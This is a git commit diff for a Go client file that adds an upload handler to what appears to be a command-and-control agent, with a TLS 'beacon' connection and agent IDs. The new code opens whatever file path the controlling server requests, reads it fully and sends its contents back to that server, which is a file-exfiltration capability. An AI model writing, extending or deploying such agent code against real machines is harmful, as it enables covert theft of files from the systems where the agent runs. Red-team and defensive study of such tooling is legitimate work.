8c23e2591126742d956713cab210d0d818e01ae0
Jarvis <mikeyjar1@gmail.com>
2024-11-11 15:56:02 -0500

    Get file uploads working

--- client/client_utils/files.go
+++ client/client_utils/files.go
@@ -40,6 +40,10 @@ func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Deco
 
 				} else if fileResponse.Type == "Upload" {
 					logger.Logf(logger.Info, "Uploading %v to server", fileResponse.Path)
+					err := uploadHandler(fileResponse, encoder, decoder)
+					if err != nil {
+						logger.Logf(logger.Error, "Error sending file: %v", err)
+					}
 				} else {
 					logger.Logf(logger.Info, "No more files to process")
 					goto Exit
@@ -74,6 +78,58 @@ func downloadHandler(fileData types.FileResponse) error {
 	logger.Logf(logger.Info, "Successfully downloaded file to %s", fileData.Path)
 	return nil
 }
+
+func uploadHandler(fileResponse types.FileResponse, encoder *gob.Encoder, decoder *gob.Decoder) error {
+	filePath := fileResponse.Path
+	file, err := os.Open(filePath)
+	if err != nil {
+		return fmt.Errorf("failed to open file for upload: %v", err)
+	}
+	defer file.Close()
+
+	fileInfo, err := file.Stat()
+	if err != nil {
+		return fmt.Errorf("failed to get file info: %v", err)
+	}
+
+	fileSize := fileInfo.Size()
+	chunk := make([]byte, fileSize)
+	_, err = file.Read(chunk)
+	if err != nil {
+		return fmt.Errorf("failed to read file contents: %v", err)
+	}
+
+	fileReq := createFileToServerRequest(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, "Success", chunk)
+
+	if err := SendRequest(encoder, types.FileToServerType, fileReq); err != nil {
+		return fmt.Errorf("error sending file to server: %v", err)
+	}
+
+	var response types.Response
+	if err := decoder.Decode(&response); err != nil {
+		return fmt.Errorf("error decoding file transfer status response: %v", err)
+	}
+
+	if response.Type == types.FileTransferStatusResponseType {
+		if configResponse, ok := response.Payload.(types.FileTransferStatusResponse); ok {
+			logger.Logf(logger.Info, "Completed a file transfer: %v", configResponse)
+		}
+	} else {
+		return fmt.Errorf("unexpected response type: %v", response.Type)
+	}
+	return nil
+}
+
+func createFileToServerRequest(fileID string, agentID string, transferType string, status string, chunk []byte) types.FileToServer {
+	return types.FileToServer{
+		FileID:    	fileID,
+		AgentID:	agentID,
+		Type:		transferType,
+		Status:		status,
+		Chunk:		chunk,
+	}
+}
+
 
 func fileTransferSuccessHandler(fileID string, agentID string, transferType string, success string, encoder *gob.Encoder, decoder *gob.Decoder) error {
 	successReq := createSuccessRequest(fileID, agentID, transferType, success)
